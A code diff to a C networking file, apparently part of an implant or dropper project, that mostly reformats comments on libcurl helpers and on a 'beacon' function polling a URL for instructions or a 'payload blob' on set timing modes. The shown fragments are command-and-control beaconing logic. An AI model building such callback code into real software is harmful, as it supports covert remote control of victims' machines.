@@ -1,12 +1,18 @@
+/**
+ * Holds all functions for needed networking functionality.
+ * 
+ * Authors: Robert Weiner, Elitania Venturella
+ */
+
 #include "networking.h"
 #include "preferences.h"
 
-/*
-    Function to overwrite libcurl's default WriteCallback
-    Will write all incoming data to passed in MemoryStruct pointer's memory element
-    Will keep track of the total size of the incoming data
-    Will re-size the struct's memory element when needed
-*/
+/**
+ * @brief DO NOT CALL MANUALLY. Function to overwrite libcurl's default WriteCallback.
+ * @note Will write all incoming data to passed in MemoryStruct pointer's memory element
+ * Will keep track of the total size of the incoming data
+ * Will re-size the struct's memory element when needed
+ */
 static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
 {
     size_t realsize = size * nmemb;
@@ -27,9 +33,10 @@ static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, voi
     return realsize;
 }
 
-/*
-    Will retrieve the file at the given URL using libcurl and will store it in a MemoryStruct object
-    Will return the filled in MemoryStruct object holding the file and it's size
+/**
+ * @brief Retrieve the file at the given URL using libCurl.
+ * @param url: Formatted URL to retrieve payload blob from.
+ * @retval MemoryStruct object holding the payload blob and it's size.
 */
 struct MemoryStruct getHTTPS(char *URL)
 {
@@ -71,13 +78,19 @@ struct MemoryStruct getHTTPS(char *URL)
     return payload;
 }
 
+/**
+ * @brief Beacon for payload blob according to beaconing modes defined in preferences.h.
+ * @param URL: Formatted URL to beacon to.
+ * @param initial: Boolean for whether this is beaconing for intructions or a payload.
+ * @retval MemoryStruct object holding the returned file blob.
+ */
 struct MemoryStruct beacon(char *URL, char initial)
 {
     struct MemoryStruct payload;
     size_t beaconMode;
     size_t beaconDateTime;
 
-    if (initial == 1)
+    if (initial)
     {
         beaconMode = BEACON_MODE_INITIAL;
         beaconDateTime = BEACON_DATE_TIME_INITIAL;
